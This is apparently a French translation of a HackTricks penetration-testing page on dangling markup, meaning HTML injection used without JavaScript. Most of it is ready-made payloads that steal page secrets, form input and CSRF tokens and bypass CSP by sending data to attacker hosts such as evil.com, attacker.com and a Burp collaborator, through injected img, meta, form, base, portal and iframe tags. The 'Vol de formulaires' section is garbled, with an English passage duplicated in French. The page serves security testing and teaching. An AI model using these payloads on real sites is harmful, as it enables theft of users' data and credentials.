# Dangling Markup - Injection HTML sans script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## R√©sum√©

Cette technique peut √™tre utilis√©e pour extraire des informations d'un utilisateur lorsqu'une **injection HTML est trouv√©e**. Cela est tr√®s utile si vous **ne trouvez aucun moyen d'exploiter un** [**XSS**](../xss-cross-site-scripting/) mais que vous pouvez **injecter certaines balises HTML**.\
C'est √©galement utile si un **secret est enregistr√© en clair** dans le HTML et que vous souhaitez l'**exfiltrer** du client, ou si vous souhaitez tromper l'ex√©cution d'un script.

Plusieurs techniques comment√©es ici peuvent √™tre utilis√©es pour contourner certaines [**politiques de s√©curit√© du contenu**](../content-security-policy-csp-bypass/) en exfiltrant des informations de mani√®re inattendue (balises HTML, CSS, balises http-meta, formulaires, base...).

## Principales applications

### Vol de secrets en texte clair

Si vous injectez `<img src='http://evil.com/log.cgi?` lorsque la page est charg√©e, la victime vous enverra tout le code entre la balise `img` inject√©e et la prochaine guillemet √† l'int√©rieur du code. Si un secret est situ√© dans ce morceau, vous le volerez (vous pouvez faire la m√™me chose en utilisant une guillemet double, regardez ce qui pourrait √™tre plus int√©ressant √† utiliser).

Si la balise `img` est interdite (en raison de la CSP par exemple), vous pouvez √©galement utiliser `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Notez que **Chrome bloque les URL HTTP** contenant "<" ou "\n", vous pouvez donc essayer d'autres sch√©mas de protocole comme "ftp".

Vous pouvez √©galement abuser de CSS `@import` (cela enverra tout le code jusqu'√† ce qu'il trouve un ";").
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Vous pouvez √©galement utiliser **`<table`** :
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Vous pouvez √©galement ins√©rer une balise `<base`. Toutes les informations seront envoy√©es jusqu'√† ce que la citation soit ferm√©e, mais cela n√©cessite une interaction de l'utilisateur (l'utilisateur doit cliquer sur un lien, car la balise base aura modifi√© le domaine point√© par le lien) :
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Vol de formulaires

---

#### Description

In some cases, web applications may have forms that are not properly secured, allowing an attacker to steal sensitive information entered by users. This technique is known as form stealing or formjacking.

#### Vulnerability

The vulnerability occurs when a web application fails to implement proper security measures to protect user input. This can happen due to various reasons, such as improper validation, lack of input sanitization, or insecure storage of user data.

#### Exploitation

To exploit this vulnerability, an attacker can inject malicious code into the web application, typically through scriptless injection techniques. This code is designed to capture user input, such as login credentials, credit card information, or personal details, and send it to a remote server controlled by the attacker.

#### Mitigation

To mitigate the risk of form stealing attacks, web developers should implement proper security measures, including:

- Input validation and sanitization to prevent malicious code injection.
- Secure storage of user data, such as using encryption or hashing algorithms.
- Regular security audits and vulnerability assessments to identify and fix any potential vulnerabilities.
- Keeping software and plugins up to date to ensure the latest security patches are applied.

---

#### Description

Dans certains cas, les applications web peuvent avoir des formulaires qui ne sont pas correctement s√©curis√©s, ce qui permet √† un attaquant de voler des informations sensibles saisies par les utilisateurs. Cette technique est connue sous le nom de vol de formulaires ou de formjacking.

#### Vuln√©rabilit√©

La vuln√©rabilit√© se produit lorsque une application web ne met pas en place les mesures de s√©curit√© appropri√©es pour prot√©ger les entr√©es des utilisateurs. Cela peut se produire pour diverses raisons, telles qu'une validation incorrecte, un manque de sanitisation des entr√©es ou un stockage non s√©curis√© des donn√©es utilisateur.

#### Exploitation

Pour exploiter cette vuln√©rabilit√©, un attaquant peut injecter du code malveillant dans l'application web, g√©n√©ralement par le biais de techniques d'injection sans script. Ce code est con√ßu pour capturer les saisies des utilisateurs, telles que les identifiants de connexion, les informations de carte de cr√©dit ou les coordonn√©es personnelles, et les envoyer √† un serveur distant contr√¥l√© par l'attaquant.

#### Att√©nuation

Pour att√©nuer le risque d'attaques de vol de formulaires, les d√©veloppeurs web doivent mettre en place des mesures de s√©curit√© appropri√©es, notamment :

- La validation et la sanitisation des entr√©es pour pr√©venir l'injection de code malveillant.
- Le stockage s√©curis√© des donn√©es utilisateur, par exemple en utilisant le chiffrement ou des algorithmes de hachage.
- Des audits de s√©curit√© r√©guliers et des √©valuations des vuln√©rabilit√©s pour identifier et corriger les √©ventuelles failles.
- Maintenir √† jour les logiciels et les plugins pour garantir l'application des derniers correctifs de s√©curit√©.
```markup
<base href='http://evil.com/'>
```
Ensuite, les formulaires qui envoient des donn√©es vers un chemin (comme `<form action='update_profile.php'>`) enverront les donn√©es vers le domaine malveillant.

### Vol de formulaires 2

D√©finissez un en-t√™te de formulaire : `<form action='http://evil.com/log_steal'>` cela √©crasera l'en-t√™te du formulaire suivant et toutes les donn√©es du formulaire seront envoy√©es √† l'attaquant.

### Vol de formulaires 3

Le bouton peut modifier l'URL vers laquelle les informations du formulaire vont √™tre envoy√©es avec l'attribut "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaquant peut utiliser cela pour voler les informations.

### Vol de secrets en texte clair 2

En utilisant la derni√®re technique mentionn√©e pour voler des formulaires (en injectant un nouvel en-t√™te de formulaire), vous pouvez ensuite injecter un nouveau champ de saisie :
```markup
<input type='hidden' name='review_body' value="
```
et ce champ de saisie contiendra tout le contenu entre ses guillemets et les guillemets suivants dans le HTML. Cette attaque m√©lange "_**Vol de secrets en texte clair**_" avec "_**Vol de formulaires2**_".

Vous pouvez faire la m√™me chose en injectant un formulaire et une balise `<option>`. Toutes les donn√©es jusqu'√† ce qu'une balise `</option>` ferm√©e soit trouv√©e seront envoy√©es :
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injection de param√®tre de formulaire

Vous pouvez modifier le chemin d'un formulaire et ins√©rer de nouvelles valeurs afin qu'une action inattendue soit effectu√©e :
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Vol de secrets en texte clair via noscript

`<noscript></noscript>` est une balise dont le contenu sera interpr√©t√© si le navigateur ne prend pas en charge JavaScript (vous pouvez activer/d√©sactiver JavaScript dans Chrome √† l'adresse [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Une fa√ßon d'exfiltrer le contenu de la page web depuis le point d'injection jusqu'en bas vers un site contr√¥l√© par l'attaquant sera d'injecter ceci :
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Contournement de CSP avec interaction utilisateur

√Ä partir de cette [recherche de PortSwigger](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), vous pouvez apprendre que m√™me dans les environnements les plus restreints par CSP, vous pouvez toujours **exfiltrer des donn√©es** avec une certaine **interaction utilisateur**. Cette fois-ci, nous allons utiliser la charge utile :
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Notez que vous demanderez √† la **victime** de **cliquer sur un lien** qui le **redirigera** vers une **charge utile** contr√¥l√©e par vous. Notez √©galement que l'attribut **`target`** √† l'int√©rieur de la balise **`base`** contiendra du **contenu HTML** jusqu'√† la prochaine apostrophe.\
Cela fera en sorte que la **valeur** de **`window.name`** lorsque le lien est cliqu√© sera tout ce **contenu HTML**. Par cons√©quent, comme vous **contr√¥lez la page** √† laquelle la victime acc√®de en cliquant sur le lien, vous pouvez acc√©der √† cette **`window.name`** et **exfiltrer** ces donn√©es :
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flux de travail trompeur 1 - Attaque de l'espace de noms HTML

Ins√©rez une nouvelle balise avec un identifiant √† l'int√©rieur de l'HTML qui √©crasera la suivante et avec une valeur qui affectera le flux d'un script. Dans cet exemple, vous s√©lectionnez avec qui une information va √™tre partag√©e:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flux de travail trompeur du script 2 - Attaque de l'espace de noms du script

Cr√©ez des variables √† l'int√©rieur de l'espace de noms du javascript en ins√©rant des balises HTML. Ensuite, cette variable affectera le flux de l'application:
```markup
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abus de JSONP

Si vous trouvez une interface JSONP, vous pourriez √™tre en mesure d'appeler une fonction arbitraire avec des donn√©es arbitraires :
```markup
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Ou vous pouvez m√™me essayer d'ex√©cuter du javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abus de l'√©l√©ment iframe

Notez qu'un **document enfant peut afficher et d√©finir la propri√©t√© de localisation du parent, m√™me s'il est en provenance d'un autre domaine.** Cela signifie que vous pouvez faire en sorte que le client acc√®de √† n'importe quelle autre page en chargeant √† l'int√©rieur d'un **iframe** du code tel que :
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Cela peut √™tre att√©nu√© avec quelque chose comme : _**sandbox=‚Äô allow-scripts allow-top-navigation‚Äô**_

Un iframe peut √©galement √™tre utilis√© pour divulguer des informations sensibles √† partir d'une autre page **en utilisant l'attribut name de l'iframe**. Cela est possible car vous pouvez cr√©er un iframe qui s'iframe lui-m√™me en abusant de l'injection HTML qui fait appara√Ætre les **informations sensibles √† l'int√©rieur de l'attribut name de l'iframe** et ensuite y acc√©der depuis l'iframe initial et les divulguer.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Pour plus d'informations, consultez [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abus

Vous pouvez utiliser **`meta http-equiv`** pour effectuer **plusieurs actions** telles que d√©finir un cookie : `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou effectuer une redirection (dans 5s dans ce cas) : `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Cela peut √™tre **√©vit√©** avec une **CSP** concernant **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nouvelle balise HTML \<portal

Vous pouvez trouver une recherche tr√®s **int√©ressante** sur les vuln√©rabilit√©s exploitables de la balise \<portal [ici](https://research.securitum.com/security-analysis-of-portal-element/).\
Au moment de la r√©daction de cet article, vous devez activer la balise portal sur Chrome dans `chrome://flags/#enable-portals` sinon cela ne fonctionnera pas.
```markup
<portal src='https://attacker-server?
```
### Fuites HTML

Toutes les fa√ßons de divulguer la connectivit√© en HTML ne seront pas utiles pour le Dangling Markup, mais parfois cela pourrait aider. Consultez-les ici: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Fuites SS

Il s'agit d'un **m√©lange** entre **dangling markup et XS-Leaks**. D'un c√¥t√©, la vuln√©rabilit√© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **m√™me origine** que celle que nous attaquerons. D'un autre c√¥t√©, nous n'**attaquerons** pas directement la page o√π nous pouvons injecter du HTML, mais **une autre page**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search est orient√© vers l'**exfiltration d'informations entre origines** en exploitant des **attaques de canal secondaire**. Par cons√©quent, il s'agit d'une technique diff√©rente du Dangling Markup, cependant, certaines des techniques abusent de l'inclusion de balises HTML (avec et sans ex√©cution de JS), comme l'**injection CSS** ou le **chargement paresseux des images**.

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Liste de d√©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## R√©f√©rences

Toutes les techniques pr√©sent√©es ici et plus encore peuvent √™tre consult√©es en d√©tail sur:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

D'autres balises HTML qui peuvent √™tre abus√©es peuvent √™tre trouv√©es ici:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

Plus d'informations:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
